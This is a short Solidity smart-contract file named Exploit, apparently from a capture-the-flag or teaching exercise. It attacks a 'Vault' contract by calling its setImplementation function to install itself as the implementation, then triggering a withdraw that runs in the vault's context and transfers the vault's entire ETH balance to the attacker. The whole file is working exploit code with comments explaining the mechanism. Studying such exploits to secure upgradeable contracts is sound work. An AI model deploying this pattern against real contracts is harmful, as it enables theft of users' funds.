// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Exploit {
    address public target;

    constructor(address _target) {
        // target is address of Vault contract
        target = _target;
    }

    receive() external payable {}

    function _call(bytes memory data) private {
        (bool executed, ) = target.call(data);
        require(executed, "failed");
    }

    function pwn() external {
        _call(
            abi.encodeWithSignature("setImplementation(address)", address(this))
        );
        _call(abi.encodeWithSignature("withdraw()"));
    }

    function withdraw() external {
        // this code is executed inside the Vault contract
        // msg.sender = this exploit contract
        // address(this).balance = ETH balance of the Vault contract
        payable(msg.sender).transfer(address(this).balance);
    }
}